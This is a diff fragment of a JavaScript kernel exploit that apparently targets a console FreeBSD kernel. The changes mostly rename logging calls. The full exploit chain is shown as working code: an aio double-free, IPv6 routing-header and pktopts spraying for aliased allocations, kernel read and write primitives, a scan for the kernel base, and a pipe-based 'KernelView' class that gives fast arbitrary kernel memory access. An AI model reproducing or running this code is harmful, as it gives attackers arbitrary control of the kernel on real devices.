+                    mark("LEAK-FD", "every leak request names fd " + leakPipe[1]
                         + " (leak pipe, write end) with nbyte=" + LEAK_NBYTE
                         + " so ar2_file comes back populated");
                 }
@@ -1535,7 +1453,7 @@ try {
                         if (verifyReqs2(j * AIO_ENTRY_SIZE)) { reqs2Base = j * AIO_ENTRY_SIZE; break; }
 
                     if (reqs2Base >= 0) {
-                        __exploitBridge.mark("REQS2-FOUND", "entry " + (reqs2Base / AIO_ENTRY_SIZE)
+                        mark("REQS2-FOUND", "entry " + (reqs2Base / AIO_ENTRY_SIZE)
                             + " after " + round + " round(s)");
                         break;
                     }
@@ -1553,17 +1471,17 @@ try {
                 const reqs1Addr = lk8(reqs2Base + AR2_REQS1);
                 const aioInfoAddr = lk8(reqs2Base + AR2_INFO);
                 const reqs1Aligned = new int64(reqs1Addr.low & 0xffffff00, reqs1Addr.hi);
-                __exploitBridge.mark("KADDR-REQS1", reqs1Aligned.toString()
+                mark("KADDR-REQS1", reqs1Aligned.toString()
                     + "  (raw " + reqs1Addr + ")");
-                __exploitBridge.mark("KADDR-AIO-INFO", aioInfoAddr.toString());
+                mark("KADDR-AIO-INFO", aioInfoAddr.toString());
 
                 const leakFp = lk8(reqs2Base + AR2_FILE);
                 if (kptr(leakFp)) kLeakFp = leakFp;
-                __exploitBridge.mark("KADDR-AR2-FILE", leakFp + (kptr(leakFp)
+                mark("KADDR-AR2-FILE", leakFp + (kptr(leakFp)
                     ? "  -- leak pipe's struct file, good for the whole run"
                     : "  -- NOT a kernel pointer, so stage 4 falls back to "
                     + "aio_info+8 exactly as before"));
-                __exploitBridge.mark("LEAK-ENTRY-INDEX", "window entry "
+                mark("LEAK-ENTRY-INDEX", "window entry "
                     + (reqs2Base / AIO_ENTRY_SIZE)
                     + " -- correlate this with whether curproc works: if the "
                     + "aio_info route only ever succeeds for one particular "
@@ -1572,7 +1490,7 @@ try {
                 let targetId = 0, restFrom = -1;
                 const totalIds = leakIds.len / 4;
 
-                __exploitBridge.mark("TARGET-SEARCH", "scanning " + (totalIds / LEAK_NUM_REQS)
+                mark("TARGET-SEARCH", "scanning " + (totalIds / LEAK_NUM_REQS)
                     + " batches, each cancel + 0x800 OOB read");
                 let lastRthdrLen = -1;
                 for (let b = 0; b < totalIds; b += LEAK_NUM_REQS) {
@@ -1580,11 +1498,11 @@ try {
                         LEAK_NUM_REQS, outs.addr);
                     const gr = getRthdr(dirty, 0x800);
                     if ((b / LEAK_NUM_REQS) % 32 === 0)
-                        __exploitBridge.mark("TARGET-SCAN", "batch " + (b / LEAK_NUM_REQS)
+                        mark("TARGET-SCAN", "batch " + (b / LEAK_NUM_REQS)
                             + " rthdr_len=" + gr);
 
                     if (gr !== 0x800) {
-                        __exploitBridge.mark("TARGET-WINDOW-LOST", "batch " + (b / LEAK_NUM_REQS)
+                        mark("TARGET-WINDOW-LOST", "batch " + (b / LEAK_NUM_REQS)
                             + " getsockopt returned " + gr + ", expected 2048 -- "
                             + "the confused evf no longer controls ip6r0_len");
                         break;
@@ -1595,7 +1513,7 @@ try {
                         targetId = leakIds.dv.getUint32(b * 4, true);
                         leakIds.dv.setUint32(b * 4, 0, true);
                         restFrom = b + LEAK_NUM_REQS;
-                        __exploitBridge.mark("TARGET-ID", hx(targetId) + " at batch "
+                        mark("TARGET-ID", hx(targetId) + " at batch "
                             + (b / LEAK_NUM_REQS));
                         break;
                     }
@@ -1614,16 +1532,16 @@ try {
                     sc(SYS.aio_multi_delete, leakIds.addr.add32(o * 4), step, outs.addr);
                 }
 
-                __exploitBridge.mark("KADDRS", "evf_cv=" + evfCv + " reqs2=" + reqs2Addr
+                mark("KADDRS", "evf_cv=" + evfCv + " reqs2=" + reqs2Addr
                     + " reqs1=" + reqs1Aligned + " aio_info=" + aioInfoAddr
                     + " target_id=" + hx(targetId) + " evf=" + hx(evf)
                     + " dirty_fd=" + dirty);
-                __exploitBridge.mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
+                mark("STAGE-2-DONE", "reqs1/reqs2/aio_info/target_id in hand");
 
-                __exploitBridge.state("stage 3: crafting the aio queue entry...");
+                state("stage 3: crafting the aio queue entry...", "warn");
 
                 sc(SYS.evf_delete, evf);
-                __exploitBridge.mark("EVF-DELETED", hx(evf));
+                mark("EVF-DELETED", hx(evf));
 
                 const NUM_BATCHES = 2;
                 const aioIds2 = alloc(AIO_MAX_NUM * NUM_BATCHES * 4);
@@ -1651,7 +1569,7 @@ try {
                     if (len === 8 && cmd === AIO_CMD_READ) {
                         qLeaked = true;
                         processBatches(true, false, false);
-                        __exploitBridge.mark("QUEUE-LEAKED", "aio queue entry over the rthdr after "
+                        mark("QUEUE-LEAKED", "aio queue entry over the rthdr after "
                             + r + " round(s), len=" + len + " ar2_cmd=" + hx(cmd));
                         break;
                     }
@@ -1671,7 +1589,7 @@ try {
 
                 sprayRthdr.dv.setUint32(REQS3_OFF + AR3_LOCK_FLAGS, 0x67b0000, true);
                 put(sprayRthdr.dv, REQS3_OFF + AR3_LOCK, new int64(1, 0));
-                __exploitBridge.mark("BATCH-CRAFTED", "ar2_info=" + reqs1Aligned
+                mark("BATCH-CRAFTED", "ar2_info=" + reqs1Aligned
                     + " ar2_batch=" + reqs2Addr.add32(REQS3_OFF)
                     + " ar3_state=COMPLETE");
 
@@ -1679,7 +1597,7 @@ try {
                     check("dirty-socket-closed", false, "fd " + dirty);
                     return false;
                 }
-                __exploitBridge.mark("DIRTY-CLOSED", "fd " + dirty + " released the aio_entry");
+                mark("DIRTY-CLOSED", "fd " + dirty + " released the aio_entry");
                 twinSocks.length = 0;
 
                 let reqId = 0, dirty2 = -1;
@@ -1717,7 +1635,7 @@ try {
                                         IPV6_RTHDR, 0, 0);
                                 const ns = sc(SYS.socket, AF_INET6, SOCK_DGRAM, 0).i32;
                                 if (ns !== -1) ipv6Socks.push(ns);
-                                __exploitBridge.mark("BATCH-OVERWRITTEN", "req_id=" + hx(reqId)
+                                mark("BATCH-OVERWRITTEN", "req_id=" + hx(reqId)
                                     + " dirty_fd=" + dirty2 + " after " + r
                                     + " round(s)");
                                 break;
@@ -1735,7 +1653,7 @@ try {
                 targetIds.dv.setUint32(0, reqId, true);
                 targetIds.dv.setUint32(4, targetId, true);
                 sc(SYS.aio_multi_poll, targetIds.addr.add32(4), 1, outs.addr);
-                __exploitBridge.mark("TARGET-ARMED", "req_id=" + hx(reqId) + " target_id="
+                mark("TARGET-ARMED", "req_id=" + hx(reqId) + " target_id="
                     + hx(targetId) + " -- both deletes now free the same 0x100 "
                     + "allocation");
 
@@ -1747,7 +1665,7 @@ try {
                 const derr0 = outs.dv.getUint32(0, true);
                 const derr1 = outs.dv.getUint32(4, true);
                 if (delMs > 300)
-                    __exploitBridge.mark("DELETE-SLOW", "aio_multi_delete of the target pair took "
+                    mark("DELETE-SLOW", "aio_multi_delete of the target pair took "
                         + delMs + " ms. Normal is under 100. The 0x100 chunk has "
                         + "been free and unclaimed for that whole time, so the "
                         + "reclaim below is likely to fail -- and if it does, "
@@ -1787,12 +1705,12 @@ try {
                         break;
                     }
                 }
-                __exploitBridge.mark("DELETE-ERRS", hx(derr0) + "," + hx(derr1)
+                mark("DELETE-ERRS", hx(derr0) + "," + hx(derr1)
                     + "   (" + delMs + " ms)");
                 check("target-deletes-reported-success",
                     derr0 === 0 && derr1 === 0, hx(derr0) + "," + hx(derr1));
                 if (ptwins && ptwins.a === ptwins.b) {
-                    __exploitBridge.mark("FALSE-TWINS", "both pktopts twins are fd " + ptwins.a
+                    mark("FALSE-TWINS", "both pktopts twins are fd " + ptwins.a
                         + " -- that is one socket seen twice, not an aliased "
                         + "allocation. refusing to build a read primitive on it.");
                     ptwins = null;
@@ -1805,18 +1723,18 @@ try {
                     return false;
 
                 pktoptsTwins.push(ptwins.a, ptwins.b);
-                __exploitBridge.mark("STAGE-3-DONE", "pktopts twins fds "
+                mark("STAGE-3-DONE", "pktopts twins fds "
                     + pktoptsTwins.join(" and ")
                     + " alias one 0x100 allocation. make_karw is step 4i, and "
                     + "it is the first point where any of this can be repaired.");
 
-                __exploitBridge.state("stage 4: kernel read...");
+                state("stage 4: kernel read...", "warn");
 
                 sprayRthdr.u8.fill(0);
                 const karwLen = buildRthdr(sprayRthdr, 0x100);
                 const pktinfoSelf = reqs1Aligned.add32(PKTOPTS_PKTINFO);
                 put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
-                __exploitBridge.mark("KARW-SPRAY", "rthdr len 0x" + karwLen.toString(16)
+                mark("KARW-SPRAY", "rthdr len 0x" + karwLen.toString(16)
                     + ", ip6po_pktinfo -> itself at " + pktinfoSelf);
 
                 if (sc(SYS.close, pktoptsTwins[1]).i32 === -1) {
@@ -1824,7 +1742,7 @@ try {
                         "fd " + pktoptsTwins[1]);
                     return false;
                 }
-                __exploitBridge.mark("PKTOPTS-TWIN-CLOSED", "fd " + pktoptsTwins[1]
+                mark("PKTOPTS-TWIN-CLOSED", "fd " + pktoptsTwins[1]
                     + " freed the pktopts; fd " + pktoptsTwins[0]
                     + " still points at it");
 
@@ -1847,7 +1765,7 @@ try {
                         if (which < ipv6Socks.length) {
                             karwSock = ipv6Socks[which];
                             ipv6Socks.splice(which, 1);
-                            __exploitBridge.mark("PKTOPTS-OVERWRITTEN", "fd " + karwSock
+                            mark("PKTOPTS-OVERWRITTEN", "fd " + karwSock
                                 + " now backs fd " + pktoptsTwins[0]
                                 + "'s pktopts, after " + r + " round(s)");
                         }
@@ -1917,7 +1835,7 @@ try {
                         kstr += String.fromCharCode(c);
                     }
                 }
-                __exploitBridge.mark("KREAD-EVF-CV", evfCv + " -> " + (cvWord || "FAILED")
+                mark("KREAD-EVF-CV", evfCv + " -> " + (cvWord || "FAILED")
                     + "  as text: '" + kstr + "'");
                 if (!check("kernel-memory-reads-string-evf",
                         kstr === "evf cv", "got '" + kstr + "'")) return false;
@@ -1937,7 +1855,7 @@ try {
                     const readEnd = !!buf && kptr(buf) && !!sz && sz.hi === 0x4000;
                     const writeEnd = !!buf && buf.low === 0 && buf.hi === 0
                         && !!sz && sz.low === 0 && sz.hi === 0;
-                    __exploitBridge.mark("SIGIO-PIPE", "ar2_file " + kLeakFp + " -> f_data "
+                    mark("SIGIO-PIPE", "ar2_file " + kLeakFp + " -> f_data "
                         + (pipeL || "?") + "   pipebuf cnt|in=" + (cnt || "?")
                         + " out|size=" + (sz || "?") + " buffer=" + (buf || "?")
                         + "   looks like " + (readEnd ? "a read end"
@@ -1954,7 +1872,7 @@ try {
                             pidBuf.addr).i32;
                         const sigAfter = io === 0
                             ? kread8(pipeL.add32(0xd0)) : null;
-                        __exploitBridge.mark("SIGIO-WALK", "ioctl(FIOSETOWN)=" + io
+                        mark("SIGIO-WALK", "ioctl(FIOSETOWN)=" + io
                             + "  pipe_sigio before=" + (sigBefore || "?")
                             + " after=" + (sigAfter || "?"));
                         const appeared = !!sigBefore && sigBefore.low === 0
@@ -1971,7 +1889,7 @@ try {
                             const pid2 = (cand && kptr(cand))
                                 ? kread8(cand.add32(0xb0)) : null;
                             const ok = !!pid2 && pid2.low === myPid && pid2.hi === 0;
-                            __exploitBridge.mark("SIGIO-PID", "sigio->proc=" + (cand || "?")
+                            mark("SIGIO-PID", "sigio->proc=" + (cand || "?")
                                 + "  p_pid=" + (pid2 ? pid2.low : "?")
                                 + " getpid=" + myPid);
                             check("proc-sigio-names-proc", ok,
@@ -1992,7 +1910,7 @@ try {
                     preTs.dv.setUint32(8, 2000000, true);
                     sc(SYS.nanosleep, preTs.addr, 0);
                 }
-                __exploitBridge.mark("KREAD-CURPROC", "aio_info+8 = "
+                mark("KREAD-CURPROC", "aio_info+8 = "
                     + (aioCurproc ? aioCurproc.toString() : "FAILED")
                     + (aioCurproc && kptr(aioCurproc) ? "  (kernel pointer)"
                         : "  (NOT a kernel pointer -- ar2_info was reclaimed)"));
@@ -2007,19 +1925,19 @@ try {
                             : "");
 
                 if (!(curproc && kptr(curproc))) {
-                    __exploitBridge.mark("CURPROC-UNAVAILABLE", "neither route produced a proc. "
+                    mark("CURPROC-UNAVAILABLE", "neither route produced a proc. "
                         + "ar2_file=" + (kLeakFp || "null") + ", aio_info at "
                         + aioInfoAddr + " reads " + (aioCurproc || "null")
                         + ". This gates the ofiles walk only; the kernel WRITE "
                         + "below is unaffected.");
                 } else {
-                    __exploitBridge.mark("CURPROC", curproc + " via " + curprocFrom);
+                    mark("CURPROC", curproc + " via " + curprocFrom);
                 }
                 const haveCurproc = !!(curproc && kptr(curproc));
                 if (haveCurproc) {
                     check("curproc-kernel-pointer", true, curproc.toString());
                     const pPid = kread8(curproc.add32(0xb0));
-                    __exploitBridge.mark("KREAD-PID", "p_pid=" + (pPid ? pPid.low : "?")
+                    mark("KREAD-PID", "p_pid=" + (pPid ? pPid.low : "?")
                         + " getpid=" + myPid);
                     check("pid-read-kernel-matches-getpid",
                         !!pPid && pPid.low === myPid && pPid.hi === 0,
@@ -2027,7 +1945,7 @@ try {
 
                     const pFd = kread8(curproc.add32(0x48));
                     const fdtOfiles = pFd ? kread8(pFd) : null;
-                    __exploitBridge.mark("KREAD-FDT", "p_fd=" + (pFd || "?")
+                    mark("KREAD-FDT", "p_fd=" + (pFd || "?")
                         + " fdt_ofiles=" + (fdtOfiles || "?"));
                     check("file-descriptor-table-reachable",
                         !!fdtOfiles && kptr(fdtOfiles),
@@ -2036,7 +1954,7 @@ try {
                     if (kLeakFp && fdtOfiles && kptr(fdtOfiles)) {
                         const slot = kread8(fdtOfiles.add32(leakPipe[1] * 8));
                         const match = !!slot && sameI64(slot, kLeakFp);
-                        __exploitBridge.mark("OFILES-CROSSCHECK", "ofiles[" + leakPipe[1] + "] = "
+                        mark("OFILES-CROSSCHECK", "ofiles[" + leakPipe[1] + "] = "
                             + (slot || "?") + "   ar2_file said " + kLeakFp);
                         check("ofiles-table-contains-struct-file"
                             + "stage 2 leaked", match,
@@ -2055,9 +1973,9 @@ try {
                         }
                         const m = pipeFData(masterPipe[0]);
                         const sl = pipeFData(slavePipe[0]);
-                        __exploitBridge.mark("PIPE-FILE", "master fd " + masterPipe[0] + " file="
+                        mark("PIPE-FILE", "master fd " + masterPipe[0] + " file="
                             + (m ? m.fp : "?") + " f_data=" + (m ? m.data : "?"));
-                        __exploitBridge.mark("PIPE-FILE", "slave  fd " + slavePipe[0] + " file="
+                        mark("PIPE-FILE", "slave  fd " + slavePipe[0] + " file="
                             + (sl ? sl.fp : "?") + " f_data=" + (sl ? sl.data : "?"));
                         const both = !!m && !!sl && m.data.low !== sl.data.low;
 
@@ -2073,30 +1991,30 @@ try {
                             const pb = [];
                             for (let o = 0; o < 0x18; o += 8)
                                 pb.push(kread8(m.data.add32(o)));
-                            __exploitBridge.mark("PIPEBUF", "master pipebuf now: "
+                            mark("PIPEBUF", "master pipebuf now: "
                                 + pb.map(function (x) { return x ? x.toString() : "?"; })
                                     .join(" "));
                         }
                     } else if (!pipesOk) {
-                        __exploitBridge.mark("PIPE-WALK-SKIPPED", "no pipe pairs to walk");
+                        mark("PIPE-WALK-SKIPPED", "no pipe pairs to walk");
                     }
                 } else {
-                    __exploitBridge.mark("FDT-WALK-SKIPPED", "no live curproc, so the ofiles "
+                    mark("FDT-WALK-SKIPPED", "no live curproc, so the ofiles "
                         + "walk cannot run. That walk is only needed for the "
                         + "PIPE route to fast R/W -- the write primitive below "
                         + "comes out of ip6po_pktinfo and needs none of it.");
                 }
 
-                __exploitBridge.mark("KREAD-STATS", kreadCalls + " kread8 calls, "
+                mark("KREAD-STATS", kreadCalls + " kread8 calls, "
                     + kreadFail + " failed");
 
-                __exploitBridge.state("stage 5: kernel write...");
+                state("stage 5: kernel write...", "warn");
 
                 const kwTarget = pktinfoSelf.sub32(8);
                 const KW_A = 0x4b571337, KW_B = 0xfeedc0de;
 
                 const before = kread8(kwTarget);
-                __exploitBridge.mark("KWRITE-TARGET", kwTarget + " currently holds "
+                mark("KWRITE-TARGET", kwTarget + " currently holds "
                     + (before || "unreadable"));
 
                 const aimRc = pktinfoSet(function (dv) {
@@ -2106,7 +2024,7 @@ try {
                 const seen = pktinfoGet();
                 const aimOk = aimRc === 0 && seen !== null && before !== null
                     && seen.low === before.low && seen.hi === before.hi;
-                __exploitBridge.mark("KWRITE-AIM", "ip6po_pktinfo -> " + kwTarget
+                mark("KWRITE-AIM", "ip6po_pktinfo -> " + kwTarget
                     + " (setsockopt=" + aimRc + "); reading back through it "
                     + "gives " + (seen || "null") + ", target held " + (before || "?"));
                 check("write-pointer-landed-where-aimed", aimOk,
@@ -2123,7 +2041,7 @@ try {
                         const c = kread8(evfCv);
                         if (c && kbuf.dv.getUint8(0) === 0x65) break;
                     }
-                    __exploitBridge.mark("KWRITE-ABORTED", "aim=unconfirmed write=none "
+                    mark("KWRITE-ABORTED", "aim=unconfirmed write=none "
                         + "selfref=restored");
                 } else {
 
@@ -2135,7 +2053,7 @@ try {
                     const back = kread8(kwTarget);
                     const wroteOk = wrc === 0 && back !== null
                         && back.low === KW_A && back.hi === KW_B;
-                    __exploitBridge.mark("KWRITE", "wrote " + hx(KW_B) + hx(KW_A).slice(2)
+                    mark("KWRITE", "wrote " + hx(KW_B) + hx(KW_A).slice(2)
                         + " at " + kwTarget + " (setsockopt=" + wrc
                         + "), kread8 returns " + (back || "unreadable"));
                     check("arbitrary-kernel-address-took-20",
@@ -2157,11 +2075,11 @@ try {
                         + "the last run");
 
                     if (wroteOk && kstr2 === "evf cv")
-                        __exploitBridge.mark("KERNEL-RW", "read=ok write=ok via=pktopts "
+                        mark("KERNEL-RW", "read=ok write=ok via=pktopts "
                             + "aim=verified selfref=restored");
                 }
 
-                __exploitBridge.state("stage 6: locating the kernel base...");
+                state("stage 6: locating the kernel base...", "warn");
                 const KSTR_RESIDUE = evfCv.low & 0x3fff;
                 const KSTR_LO = params.has("kstrlo")
                     ? parseInt(params.get("kstrlo"), 16) : 0x780000;
@@ -2169,11 +2087,11 @@ try {
                     ? parseInt(params.get("kstrhi"), 16) : 0x800000;
                 const ELF_MAGIC = 0x464c457f;
 
-                __exploitBridge.mark("KSTR-PLAN", "residue=0x" + KSTR_RESIDUE.toString(16)
+                mark("KSTR-PLAN", "residue=0x" + KSTR_RESIDUE.toString(16)
                     + " window=0x" + KSTR_LO.toString(16) + "..0x"
                     + KSTR_HI.toString(16) + " step=0x4000 order=ascending");
                 if (KSTR_RESIDUE !== 0x26f)
-                    __exploitBridge.mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
+                    mark("KSTR-RESIDUE-ODD", "expected 0x26f from the earlier "
                         + "runs but this one gives 0x" + KSTR_RESIDUE.toString(16)
                         + " -- the constraint may not hold, treat the result "
                         + "with suspicion");
@@ -2191,7 +2109,7 @@ try {
                         kstrOff = off; kbase = cand; break;
                     }
                 }
-                __exploitBridge.mark("KSTR-SCAN", tried + " candidate(s) tested, last read "
+                mark("KSTR-SCAN", tried + " candidate(s) tested, last read "
                     + (lastRead || "null")
                     + (kstrOff >= 0 ? "" : " -- no ELF header found"));
 
@@ -2202,7 +2120,7 @@ try {
                     const eMachine = hdr ? ((hdr.low >>> 16) & 0xffff) : -1;
                     const ident = kread8(kbase);
                     const eiClass = ident ? (ident.hi & 0xff) : -1;
-                    __exploitBridge.mark("KERNEL-BASE", kbase + "   e_type=" + eType
+                    mark("KERNEL-BASE", kbase + "   e_type=" + eType
                         + " e_machine=0x" + eMachine.toString(16)
                         + " ei_class=" + eiClass);
                     const hdrOk = (eType === 2 || eType === 3) && eMachine === 0x3e
@@ -2210,10 +2128,10 @@ try {
                     check("elf-header-base-checks", hdrOk,
                         "want e_type 2 or 3, e_machine 0x3e, ei_class 2");
                     if (hdrOk) {
-                        __exploitBridge.mark("OFF-KSTR", "0x" + kstrOff.toString(16)
+                        mark("OFF-KSTR", "0x" + kstrOff.toString(16)
                             + "   (evf_cv " + evfCv + " - kernel base " + kbase
                             + ")   residue 0x" + (kstrOff & 0x3fff).toString(16));
-                        __exploitBridge.mark("OFF-KSTR-COMPARE", "known: 6.00 0x7da91c, 7.xx "
+                        mark("OFF-KSTR-COMPARE", "known: 6.00 0x7da91c, 7.xx "
                             + "0x7f92cb, 8.xx 0x79a92e, 9.xx 0x7edcff, PSFree "
                             + "0x7f6f27 -- this one is 0x" + kstrOff.toString(16));
                         check("off_kstr for " + key + " recovered", true,
@@ -2242,7 +2160,7 @@ try {
                         slowMs = Date.now() - t0;
                     }
                     const slowBps = Math.round(slowOk * 8 * 1000 / Math.max(1, slowMs));
-                    __exploitBridge.mark("SLOW-READ-BENCH", slowOk + "/32 eight-byte reads via "
+                    mark("SLOW-READ-BENCH", slowOk + "/32 eight-byte reads via "
                         + "setsockopt+getsockopt in " + slowMs + " ms = "
                         + slowBps + " bytes/s");
 
@@ -2261,7 +2179,7 @@ try {
                             same = got.u8[i] === pat.u8[i];
                         const reset = !!endCnt && endCnt.low === 0 && endCnt.hi === 0
                             && !!endOut && endOut.low === 0;
-                        __exploitBridge.mark("PIPE-PREFLIGHT", "write=" + w + " read=" + r
+                        mark("PIPE-PREFLIGHT", "write=" + w + " read=" + r
                             + "  bytes identical=" + same
                             + "  pipebuf mid cnt|in=" + (midCnt || "?")
                             + "  end cnt|in=" + (endCnt || "?")
@@ -2290,7 +2208,7 @@ try {
                             const aimOk = aimRc === 0 && seenOut && beforeOut
                                 && seenOut.low === beforeOut.low
                                 && seenOut.hi === beforeOut.hi;
-                            __exploitBridge.mark("FASTRW-AIM", "ip6po_pktinfo -> " + outAddr
+                            mark("FASTRW-AIM", "ip6po_pktinfo -> " + outAddr
                                 + "; through it reads " + (seenOut || "null")
                                 + ", kread8 said " + (beforeOut || "?"));
                             check("pipebuf-aim-confirmed-before-writing",
@@ -2303,7 +2221,7 @@ try {
                                     dv.setUint32(4, PIPE_PAGE, true);
                                     put(dv, 8, pipeS);
                                 });
-                                __exploitBridge.mark("FASTRW-WRITE", "master pipebuf <- out=0 size=0x"
+                                mark("FASTRW-WRITE", "master pipebuf <- out=0 size=0x"
                                     + PIPE_PAGE.toString(16) + " buffer=" + pipeS
                                     + " (setsockopt=" + wRc + ")");
 
@@ -2314,7 +2232,7 @@ try {
                             const gotSize = pktinfo.dv.getUint32(4, true);
                             const gotBuf = new int64(pktinfo.dv.getUint32(8, true),
                                                      pktinfo.dv.getUint32(12, true));
-                            __exploitBridge.mark("FASTRW-READBACK", "pipebuf out="
+                            mark("FASTRW-READBACK", "pipebuf out="
                                 + pktinfo.dv.getUint32(0, true) + " size=0x"
                                 + gotSize.toString(16) + " buffer=" + gotBuf
                                 + "   want buffer=" + pipeS);
@@ -2331,12 +2249,12 @@ try {
                                         || openFds[i] === slavePipe[0]
                                         || openFds[i] === slavePipe[1])
                                         openFds.splice(i, 1);
-                                __exploitBridge.mark("PIPES-PINNED", "master " + masterPipe
+                                mark("PIPES-PINNED", "master " + masterPipe
                                     + " and slave " + slavePipe + " taken off "
                                     + "the cleanup list -- closing master would "
                                     + "kmem_free slave's struct pipe");
 
-                                __exploitBridge.state("building KernelView...");
+                                state("building KernelView...", "warn");
 
                                 function toI64(v) {
                                     return (typeof v === "number")
@@ -2446,7 +2364,6 @@ try {
                                     }
 
                                     getFloat64(byteOffset, littleEndian = false) {
-                                        this.view.u8.fill(0);
                                         this.kread(this.dvBacking,
                                                    this.pipeBacking.add32(byteOffset), 8);
                                         return this.view.dv.getFloat64(0, littleEndian);
@@ -2588,7 +2505,7 @@ try {
                                 }
 
                                 kv = new KernelView(masterPipe, slavePipe);
-                                __exploitBridge.mark("KERNELVIEW", "built on master "
+                                mark("KERNELVIEW", "built on master "
                                     + masterPipe + " / slave " + slavePipe
                                     + ", pipebuf scratch at " + kv.pipeBuf.addr
                                     + ", 8-byte view at " + kv.dvBacking);
@@ -2600,7 +2517,7 @@ try {
                                     if (!c) break;
                                     kvStr += String.fromCharCode(c);
                                 }
-                                __exploitBridge.mark("KV-READ", evfCv + " -> " + kvCv
+                                mark("KV-READ", evfCv + " -> " + kvCv
                                     + "  as text: '" + kvStr + "'");
                                 check("kernelview-reads-kernel-memory-evf",
                                     kvStr === "evf cv", "got '" + kvStr + "'");
@@ -2609,10 +2526,10 @@ try {
                                 const fpS = fget(slavePipe[0]);
                                 const dM = kview(fpM).getBInt(0, true);
                                 const dS = kview(fpS).getBInt(0, true);
-                                __exploitBridge.mark("KV-FGET", "master fp " + fpM + " (kread8 said "
+                                mark("KV-FGET", "master fp " + fpM + " (kread8 said "
                                     + pipeMFp + "), f_data " + dM
                                     + " (kread8 said " + pipeM + ")");
-                                __exploitBridge.mark("KV-FGET", "slave  fp " + fpS + " (kread8 said "
+                                mark("KV-FGET", "slave  fp " + fpS + " (kread8 said "
                                     + pipeSFp + "), f_data " + dS
                                     + " (kread8 said " + pipeS + ")");
                                 check("pipes-ofiles-entries-match"
@@ -2627,7 +2544,7 @@ try {
                                 const mOut = kview(pipeM).getUint32(8, true);
                                 const mSize = kview(pipeM).getUint32(0x0c, true);
                                 const mBuf = kview(pipeM).getBInt(0x10, true);
-                                __exploitBridge.mark("KV-PIPEBUF", "master cnt=" + mCnt + " in=" + mIn
+                                mark("KV-PIPEBUF", "master cnt=" + mCnt + " in=" + mIn
                                     + " out=" + mOut + " size=0x" + mSize.toString(16)
                                     + " buffer=" + mBuf);
                                 check("master-pipebuf-aimed-slave"
@@ -2653,10 +2570,10 @@ try {
                                     const eMachine = ehdr.dv.getUint16(0x12, true);
                                     const eEntry = new int64(ehdr.dv.getUint32(0x18, true),
                                                              ehdr.dv.getUint32(0x1c, true));
-                                    __exploitBridge.mark("KV-BULK", gotN + "/" + ELF_N
+                                    mark("KV-BULK", gotN + "/" + ELF_N
                                         + " bytes from " + kbase + " in ONE read(2): "
                                         + hexBytes(ehdr.u8.subarray(0, 16)));
-                                    __exploitBridge.mark("KV-ELF", "magic=" + hx(magic)
+                                    mark("KV-ELF", "magic=" + hx(magic)
                                         + " ei_class=" + eiClass + " e_type=" + eType
                                         + " e_machine=" + hx(eMachine)
                                         + " e_entry=" + eEntry);
@@ -2667,7 +2584,7 @@ try {
                                         && (eType === 2 || eType === 3),
                                         "read " + gotN + " bytes, magic " + hx(magic));
                                 } else {
-                                    __exploitBridge.mark("KV-BULK-SKIPPED", "stage 6 found no "
+                                    mark("KV-BULK-SKIPPED", "stage 6 found no "
                                         + "kernel base, so there is no address "
                                         + "known to have 0x100 mapped bytes");
                                 }
@@ -2684,7 +2601,7 @@ try {
                                 }
                                 const tcSock0 = tclassGet();
                                 const tcKv0 = kview(tcAddr).getUint32(0, true) >>> 0;
-                                __exploitBridge.mark("KV-TCLASS", "socket says " + hx(tcSock0)
+                                mark("KV-TCLASS", "socket says " + hx(tcSock0)
                                     + ", kv says " + hx(tcKv0) + " at " + tcAddr);
                                 check("kv-getsockoptipv6_tclass-read"
                                     + "same kernel word", tcSock0 !== -1
@@ -2696,7 +2613,7 @@ try {
                                 kview(tcAddr).setUint32(0, KV_WITNESS, true);
                                 const tcSock1 = tclassGet();
                                 const tcKv1 = kview(tcAddr).getUint32(0, true) >>> 0;
-                                __exploitBridge.mark("KV-WRITE", "wrote " + hx(KV_WITNESS)
+                                mark("KV-WRITE", "wrote " + hx(KV_WITNESS)
                                     + " at " + tcAddr + "; socket now says "
                                     + hx(tcSock1) + ", kv says " + hx(tcKv1));
                                 check("kernel-word-written-through-pipes"
@@ -2720,7 +2637,7 @@ try {
                                 const magic64 = new int64(0x4b565701, 0xc0de4e01);
                                 kview(scratch).setBInt(0, magic64, true);
                                 const back64 = kview(scratch).getBInt(0, true);
-                                __exploitBridge.mark("KV-RW64", "wrote " + magic64 + " at " + scratch
+                                mark("KV-RW64", "wrote " + magic64 + " at " + scratch
                                     + ", read " + back64);
                                 check("8-byte-kernel-round-trip-through",
                                     sameI64(back64, magic64), back64.toString());
@@ -2743,35 +2660,35 @@ try {
                                 }
                                 const fastBps = Math.round(32 * 8 * 1000
                                     / Math.max(1, fastMs));
-                                __exploitBridge.mark("KV-BENCH", "32 eight-byte reads in " + fastMs
+                                mark("KV-BENCH", "32 eight-byte reads in " + fastMs
                                     + " ms = " + fastBps + " bytes/s   (socket "
                                     + "options managed " + slowBps + " bytes/s)");
                                 if (pageN)
-                                    __exploitBridge.mark("KV-BENCH-BULK", pageN + " bytes in "
+                                    mark("KV-BENCH-BULK", pageN + " bytes in "
                                         + pageMs + " ms = "
                                         + Math.round(pageN * 1000 / Math.max(1, pageMs))
                                         + " bytes/s in 0x1000-byte reads");
-                                __exploitBridge.mark("KV-STATS", kv.flushes + " flushes, "
+                                mark("KV-STATS", kv.flushes + " flushes, "
                                     + kv.bytesRead + " bytes read, "
                                     + kv.bytesWritten + " bytes written");
 
                                 const kvLive = kvStr === "evf cv"
                                     && tcSock1 === KV_WITNESS;
                                 if (kvLive)
-                                    __exploitBridge.mark("KERNELVIEW-LIVE", "kv is the primitive "
+                                    mark("KERNELVIEW-LIVE", "kv is the primitive "
                                         + "now. ip6po_pktinfo is not needed again "
                                         + "-- which is exactly what makes the "
                                         + "repair below possible: every write it "
                                         + "needs goes through the pipes.");
 
                                 if (!kvLive) {
-                                    __exploitBridge.mark("REPAIR-SKIPPED", "kv did not prove out, "
+                                    mark("REPAIR-SKIPPED", "kv did not prove out, "
                                         + "so stage 7 has no write primitive it "
                                         + "can trust. Nothing is repaired and "
                                         + "nothing is closed.");
                                 } else {
 
-                                __exploitBridge.state("stage 7: repairing the aliases...");
+                                state("stage 7: repairing the aliases...", "warn");
 
                                 const PKTOPTS_M = 0x00;
                                 const PKTOPTS_RTHDR = 0x68;
@@ -2811,16 +2728,16 @@ try {
                                 const rthdrC = optsC
